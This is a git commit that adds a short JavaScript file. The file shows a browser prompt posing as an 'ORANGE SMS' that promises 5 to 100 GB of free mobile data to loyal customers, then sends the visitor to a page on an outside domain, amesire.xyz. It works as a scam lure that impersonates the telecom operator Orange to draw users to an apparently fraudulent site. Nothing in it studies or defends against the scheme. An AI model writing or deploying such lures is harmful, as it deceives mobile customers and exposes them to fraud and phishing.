58d2ed654075c31b0b432658a83870519951e3dd
esiditid <amesire247@gmail.com>
2025-07-13 05:37:04 -0700

    Create activation-freeorangedata.js

---
+++ activation-freeorangedata.js
@@ -0,0 +1,6 @@
+
+var password = 'DONNÉES GRATUITES'
+password=prompt('ORANGE SMS: Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir de 5 Go à 100 Go de données, récompense des clients estimés, appuyez sur Données gratuites pour vérifier maintenant ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://amesire.xyz/freeorangedata.com.html';
+}
